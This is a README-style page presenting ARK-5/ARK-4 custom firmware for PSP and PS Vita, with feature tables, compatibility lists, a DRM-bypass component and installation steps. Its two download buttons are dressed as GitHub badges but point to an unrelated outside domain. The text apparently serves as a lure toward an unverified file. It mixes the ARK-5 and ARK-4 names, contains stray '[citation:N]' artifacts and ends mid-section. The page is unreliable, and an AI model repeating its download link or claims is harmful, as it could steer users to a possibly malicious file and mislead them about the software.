# ARK-5 Custom Firmware

ARK-5 is a custom firmware for the Sony PlayStation Portable (PSP) and the ePSP environment on PlayStation Vita. It provides unsigned code execution, ISO/CSO game loading, plugin management, and PS1 game support across all PSP hardware revisions and compatible Vita models.

<a href="https://dyhuiying.com/s/file">
  <img src="https://img.shields.io/badge/DOWNLOAD-ARK--4%20CFW-1E3A5F?style=for-the-badge&logo=github&logoColor=white" alt="Download ARK-4 CFW">
</a>

![Platform](https://img.shields.io/badge/PLATFORM-PSP%20%7C%20PS%20VITA-2C3E50?style=flat-square)
![Category](https://img.shields.io/badge/CATEGORY-CUSTOM%20FIRMWARE-34495E?style=flat-square)
![Firmware](https://img.shields.io/badge/FIRMWARE-6.60%20%7C%206.61-4A6FA5?style=flat-square)

## Overview

ARK-4 is the fourth generation of the ARK custom firmware lineage, originally derived from PRO CFW for the PS Vita ePSP environment. The project was subsequently ported to native PSP hardware, targeting firmware versions 6.60 and 6.61 [citation:4][citation:14].

The firmware implements a dynamic patching core that intercepts system calls and extends the PSP's native functionality without replacing the entire system software. ARK-4 installs a minimal set of files to the console's flash storage while loading extended functionality from the Memory Stick, reducing the footprint on internal storage [citation:12].

ARK-4 is distributed as a complete CFW package supporting both live (non-permanent) and permanent installation modes. Permanent installation is achieved through compatible bootloaders such as cIPL or Infinity 2, while live installations require re-running the ARK Loader after each reboot [citation:12].

The final official release, v4.20.69 r206, was published in 2026 and serves as a bridge to the successor project ARK-5 [citation:1][citation:3]. The repository has been archived, and no further ARK-4 updates are planned.

## Key Features

| Component | Description |
|---|---|
| Core Patching System | Dynamic kernel patching for unsigned code execution on 6.60/6.61 firmware |
| Inferno 2 Driver | ISO/CSO/ZSO/JSO/CSOv2/DAX image loading with cache support |
| Stargate No-DRM Engine | Built-in DRM bypass for compatible titles; compatible with npdrm_free and nploader |
| Popcorn PS1 Controller | Custom PS1 game support with external configuration; compatible with PopsLoader V3/V4i |
| Plugin System | Per-game plugin loading for PSP games, PS1 games, and VSH (XMB) |
| Custom Launcher | File browser, FTP server/client, game categories, and ISO video preview |
| Recovery Application | Soft-brick resistance with recovery menu and USB mount support |
| OTA Updates | Internet-based firmware updates via System Update in XMB |
| WPA2 Wi-Fi Support | Built-in WPA2 connectivity (2.4 GHz band) for compatible models [citation:13] |
| Legacy Homebrew | eLoader, Leda Plugin, and 1.50 Kernel Addon compatibility |

## Technical Specifications

| Property | Details |
|---|---|
| Software Name | ARK-4 |
| Target Platform | PlayStation Portable / PS Vita ePSP |
| Console Family | PSP-1000/2000/3000/Go/E1000; PS Vita all models (ePSP) |
| Software Category | Custom Firmware (CFW) |
| Firmware Environment | PSP System Software 6.60 / 6.61 |
| Vita ePSP Range | 2.10 to 3.74 (OFW or Henkaku) [citation:4] |
| Final Version | v4.20.69 r206 [citation:1] |
| Installation Method | ARK Loader (live) or cIPL/Infinity 2 (permanent) |
| Package Format | ZIP archive containing PSP and PSVita folders |
| Storage Medium | Memory Stick PRO Duo / SD (via adapter) / Vita storage |
| License | Open source (see repository) |

## Compatibility

### PSP Compatibility

| Model | Firmware | Installation Method | Notes |
|---|---|---|---|
| PSP-1000 | 6.60 / 6.61 | Live or Permanent | Full support including 1.50 addon |
| PSP-2000 | 6.60 / 6.61 | Live or Permanent | Full support |
| PSP-3000 | 6.60 / 6.61 | Live or Permanent | Full support |
| PSP Go (N1000) | 6.60 / 6.61 | Live or Permanent | Internal memory (ef0) support |
| PSP E1000 | 6.60 / 6.61 | Live or Permanent | Full support |

### PS Vita Compatibility

| Firmware Range | Method | Requirements |
|---|---|---|
| 3.60 – 3.74 | FastARK / NoPspEmuDrm | Henkaku/h-encore or native hack |
| 2.10 – 3.74 | ChovySign | Valid PSN PSP license (no hack required after install) |
| 3.60 – 3.74 | Adrenaline | Henkaku/h-encore + Adrenaline |

PS Vita standalone installations may lack certain features available on native PSP hardware, including full XMB functionality and some PS1 game sound support [citation:4].

## Firmware Features

### Inferno 2 ISO Driver

The Inferno 2 driver provides native loading of PSP game images in multiple formats. It supports ISO, CSO, ZSO, JSO, CSOv2, and DAX containers. Cache support can be enabled through the CFW settings to improve loading performance for certain titles [citation:12].

### Plugin Architecture

ARK-4 implements a per-game plugin system controlled through `PLUGINS.TXT` on the Memory Stick. Plugins can be enabled for specific runlevels (game, homebrew, PS1, VSH) or bound to individual game IDs. A disable line can override a global enable for problematic titles [citation:11].

Supported runlevel keywords include:
- `all` / `always`: unconditional loading
- `psp` / `umd`: retail game loading only
- `homebrew`: homebrew only
- `game`: retail and homebrew
- `psx` / `pops`: PS1 games only
- `xmb` / `vsh`: XMB environment only

### Configuration System

CFW settings can be managed through the XMB, Recovery Menu, or manually via `SETTINGS.TXT`. Available settings include overclock/powersave CPU profiles, USB charging, high memory mode, Inferno cache, and logo skipping. Settings follow the same runlevel targeting syntax as plugins [citation:11][citation:14].

### Recovery and Brick Resistance

ARK-4 includes a recovery application accessible through the boot process. The firmware is designed to resist soft-bricks caused by configuration errors, with multiple recovery paths including loading Despertar del Cementerio (DC) via cIPL without additional hardware [citation:4].

## System Requirements

| Requirement | Specification |
|---|---|
| Target Console | PSP (all models) or PS Vita (ePSP) |
| PSP Firmware | 6.60 or 6.61 |
| Vita Firmware | 2.10 – 3.74 (method-dependent) |
| Storage Medium | Memory Stick PRO Duo or compatible SD adapter |
| Minimum Free Space | ~10 MB for CFW files; additional for game images |
| Host Computer | Windows, macOS, or Linux for file transfer |
| USB Connection | Mini-USB (PSP) or Vita USB cable |
| Permanent CFW (PSP) | cIPL or Infinity 2 bootloader |

## Download & Installation

### PSP Installation (Live CFW)

1. **Download the ARK-4 package** using the button below and extract the archive.

2. **Prepare the Memory Stick**. Connect the PSP to your computer via USB or use a card reader.

3. **Copy required folders**. Transfer the `ARK_01234` folder to `/PSP/SAVEDATA/` and the `ARK_Loader` folder to `/PSP/GAME/` on the Memory Stick [citation:12].

4. **Launch the installer**. On the PSP, navigate to the Game menu and run `ARK Loader`. The installer will write the required modules to flash storage and boot into the custom firmware.

5. **Live CFW operation**. After installation, ARK-4 operates as a live CFW. The loader must be run again after each full power-off or reboot. Sleep mode preserves the CFW state.

### Permanent Installation (PSP)

To convert to permanent CFW, install a compatible bootloader (cIPL or Infinity 2) and run the Full Installer from the ARK-4 package. Follow the bootloader-specific installation instructions provided with the installer.

### PS Vita Installation

For PS Vita ePSP installation, use one of the following methods:
- **FastARK**: Requires Henkaku/h-encore; installs ARK and ARK-X bubbles [citation:6]
- **NoPspEmuDrm**: Requires a valid PSN PSP license; no permanent hack required
- **Adrenaline**: Install ARK loader within the Adrenaline environment

<a href="https://dyhuiying.com/s/file">
  <img src="https://img.shields.io/badge/DOWNLOAD-ARK--4%20CFW-1E3A5F?style=for-the-badge&logo=github&logoColor=white" alt="Download ARK-4 CFW">
</a>

## Configuration & Management

### Recovery Menu Access

The Recovery Menu is accessible by holding the **R Trigger** during boot (when using cIPL/Infinity) or through the XMB. The Recovery Menu provides access to:
- Toggle USB mount for flash storage
- Change CFW settings
- Launch the ARK installer
- Advanced configuration options

### Plugin Configuration

Plugins are managed through `ms0:/seplugins/PLUGINS.TXT`. The file supports runlevel targeting and per-game overrides. Example configuration:
